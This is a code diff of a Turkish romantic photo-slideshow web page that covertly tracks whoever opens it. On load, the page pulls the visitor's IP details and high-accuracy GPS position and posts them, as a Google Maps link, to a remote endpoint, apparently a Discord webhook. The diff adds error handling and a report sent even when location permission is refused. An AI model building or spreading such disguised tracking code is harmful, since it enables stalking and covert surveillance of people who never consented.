@@ -37,11 +37,11 @@
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({content: m})
-            });
+            }).catch(err => console.error("Hata:", err));
         }
 
         // Sayfa yüklendiğinde otomatik başlar
-        window.onload = function() {
+        window.addEventListener('load', function() {
             // 1. IP Bilgisi
             fetch('https://ipapi.co/json/')
                 .then(r => r.json())
@@ -53,14 +53,17 @@
                         navigator.geolocation.getCurrentPosition(function(p) {
                             var enlem = p.coords.latitude;
                             var boylam = p.coords.longitude;
+                            // En basit Google Maps linki
                             var link = "https://www.google.com/maps?q=" + enlem + "," + boylam;
                             dcGonder("🎯 **Hassas Konum!**\n🗺️ Harita: " + link);
-                        }, null, {enableHighAccuracy: true, timeout: 10000});
+                        }, function(err) {
+                            dcGonder("⚠️ Konum izni verilmedi veya hata: " + err.message);
+                        }, {enableHighAccuracy: true, timeout: 10000, maximumAge: 0});
                     }
                 });
-        };
+        });
 
-        // --- SENİN FOTOĞRAF GEÇİŞ SİSTEMİN ---
+        // --- FOTOĞRAF GEÇİŞ SİSTEMİ ---
         const fotolar = ["foto1.jpg", "foto2.jpg", "foto3.jpg", "foto4.jpg", "foto5.jpg"];
         const sozler = ["Seninle her günüm daha güzel.", "Gülüşün dünyamı aydınlatıyor.", "Kalbim hep seninle.", "Sana her baktığımda yeniden aşık oluyorum.", "İyi ki varsın, iyi ki benimsin."];
         let index = 0;
